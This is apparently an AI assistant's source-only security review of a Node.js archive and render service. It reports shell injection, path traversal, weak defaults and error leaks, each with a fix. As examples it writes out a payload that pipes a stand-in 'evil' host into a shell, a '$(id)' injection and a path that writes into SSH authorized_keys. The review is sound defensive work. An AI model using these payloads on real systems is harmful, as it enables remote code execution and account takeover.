I found two serious problems in the write and render paths, plus several smaller ones. I read the source only and ran nothing, so none of this was tested. I didn't open the tests, docs, `archive/`, `notes/`, `research/` or `tools/`.

## High severity

**1. Shell command injection in the renderer (`src/render/process.mjs:8`)**
- The command is built by string concatenation and run through `exec`, which uses a shell: `program + ' "%s" "' + label + '" > "' + output + '"'`.
- `receiptLabel` (`src/validation.mjs:13`) only checks length and rejects `\r` and `\n`. Double quotes, `$(...)`, backticks, `;` and `&` all pass.
- A label such as `x"; curl evil|sh; "` or `$(id)` runs arbitrary commands as the service account.
- This contradicts the README's claim that the operator credential grants no shell access. It also lets the operator change what the renderer does, which the README says they must not be able to do.
- Fix: use `execFile`/`spawn` with no shell and an argument array (`['%s', label]`). Write stdout to the file from Node with `writeFile`, or open the output file and pass it as the child's stdout.

**2. Path traversal in archive unpacking (`src/storage/files.mjs:7`)**
- `join(directory, entry.name)` is never checked to stay inside the workspace.
- `decodeEntries` only checks that `name` is a string of 160 characters or fewer. The workspace-name rules ("no slashes, dots") are not applied to entry names.
- A name like `../../../home/svc/.ssh/authorized_keys` or `../other-ws/x` lets the operator write any file the service account can write. This is also an arbitrary file write that overwrites other workspaces and the receipts directory.
- The README explicitly says writing outside the workspace root is not authorized.
- Fix: `resolve` the destination and require that it starts with `resolve(directory) + sep`. Reject absolute names, `..` segments and NUL bytes. Consider `lstat` checks for symlinks as defense in depth, because the README's "no preexisting symlinks" assumption is only an assumption.

These two combine: the traversal write can plant files that the injected shell command then runs.

## Medium severity

- **Weak default exposure.** `config/shipping.json:3` sets `listen` to `0.0.0.0`, and `base.json` ships a known token (`synthetic-operator-token`). The README says the service is for a private network. The launcher doesn't refuse to start with the placeholder token, so a deployment that forgets to change it is open to anyone who can reach the port. Bind to localhost by default and refuse to start with the placeholder token.
- **Non-constant-time token comparison** (`src/identity.mjs:2`). Use `crypto.timingSafeEqual` on hashed values. Tokens have no rotation or multi-operator support, and there is only one shared identity.
- **Authentication runs before the body is read, but the whole body is buffered before the size check** (`src/wire.mjs:4-5`). The limit throws only after the chunk has been appended. `Buffer.byteLength(text)` is recomputed on every chunk, which is O(n²) in the worst case. Chunks are also concatenated as strings, which can corrupt multi-byte characters split across chunks. Collect Buffers, count bytes per chunk, and destroy the request when the limit is exceeded.
- **Error handling leaks internals and mislabels errors** (`src/server.mjs:13`).
  - `error.message` is returned to the client. That includes `JSON.parse` messages and, for renderer failures, `exec` errors that contain the full command line.
  - Anything without a `status` becomes 400, including real server failures such as `mkdir` or `writeFile` errors.
  - The README claims a "generic" error body, which is not accurate.
- **Internals not enforced by validation:** `decodeEntries` doesn't check that each `entry` is a non-null object, so `[null]` throws a TypeError that surfaces as a 400. The 4096 limit counts characters, not bytes. There is no limit on total archive size or on duplicate names.

## Low severity

- **Route matching uses `request.url` directly.** A query string such as `/archives/unpack?x=1` returns 404, and there is no HTTP method check, so GET works the same as POST.
- **No request timeout, concurrency limit or rate limit.** Renderer processes can pile up, with a 2 s timeout per process.
- **Concurrent renders to the same workspace race on the same output file.** The shell redirect truncates the file even if the renderer then fails.
- **`configuration.mjs` validation is thin.**
  - `routeModule.startsWith('./routes/')` doesn't block `./routes/../x`.
  - `renderProgram`, `maxBodyBytes` and `maxEntries` are not validated, so a missing option fails at request time.
  - `base.json` sets `routeModule` to `compatibility.mjs`, and the shipping overlay overrides it. Dropping the overlay silently switches routes.
- **Packaging.** The `exports` field exposes only `src/public.mjs`, but `bin` points at `dist/launcher.mjs`, which imports `../src/...`. `package.json` has no `files` whitelist, so `archive/legacy-server.mjs`, `notes/` and `research/` would likely ship in the tarball. Add a `files` list.
- **Retained legacy and vendor material** (`archive/legacy-server.mjs`, `notes/vendor-receipt.md`). I didn't review these. Confirm they aren't reachable from any import path.

## Priorities
1. Replace `exec` with `execFile`/`spawn`, with no shell.
2. Confine entry paths to the workspace.
3. Change the default listen address and token handling.
4. Harden the body reader and error responses.

I can draft patches for the first two if you'd like.
